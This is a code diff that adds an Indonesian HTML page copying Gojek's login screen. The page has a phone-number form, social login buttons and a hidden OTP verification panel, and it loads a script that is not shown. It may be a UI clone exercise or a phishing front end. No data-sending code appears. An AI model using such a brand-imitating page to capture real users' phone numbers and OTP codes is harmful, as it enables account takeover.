@@ -1,0 +1,79 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Gojek</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body class="login-page">
+    <div class="login-container">
+        <div class="logo">
+            <h1>GOJEK</h1>
+            <p>Life's easier with Gojek</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="phone">Nomor Telepon</label>
+                <div class="phone-input">
+                    <select id="countryCode">
+                        <option value="+62">+62 (IDN)</option>
+                        <option value="+1">+1 (USA)</option>
+                        <option value="+60">+60 (MAS)</option>
+                    </select>
+                    <input type="tel" id="phone" placeholder="81234567890" required>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-login">LANJUT</button>
+
+            <div class="divider">ATAU</div>
+
+            <button type="button" class="btn-social">
+                <i class="fab fa-google"></i> Lanjut dengan Google
+            </button>
+            <button type="button" class="btn-social">
+                <i class="fab fa-facebook"></i> Lanjut dengan Facebook
+            </button>
+
+            <div class="terms">
+                <p>Dengan melanjutkan, saya menyetujui <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> Gojek</p>
+            </div>
+        </form>
+
+        <div class="signup-link">
+            <p>Pengguna baru? <a href="#" id="signupLink">Daftar</a></p>
+        </div>
+    </div>
+
+    <div class="otp-container" id="otpContainer" style="display: none;">
+        <div class="logo">
+            <h1>GOJEK</h1>
+            <p>Verifikasi Nomor Anda</p>
+        </div>
+
+        <p class="otp-info">Kami telah mengirimkan kode OTP ke <span id="phoneNumberDisplay"></span></p>
+
+        <form id="otpForm">
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" class="otp-input">
+                <input type="text" maxlength="1" class="otp-input">
+                <input type="text" maxlength="1" class="otp-input">
+                <input type="text" maxlength="1" class="otp-input">
+            </div>
+
+            <button type="submit" class="btn-verify">VERIFIKASI</button>
+
+            <div class="resend-otp">
+                <p>Tidak menerima kode? <a href="#" id="resendOtp">Kirim ulang</a></p>
+                <p id="countdown">(60)</p>
+            </div>
+        </form>
+    </div>
+
+    <script src="auth.js"></script>
+</body>
+</html>
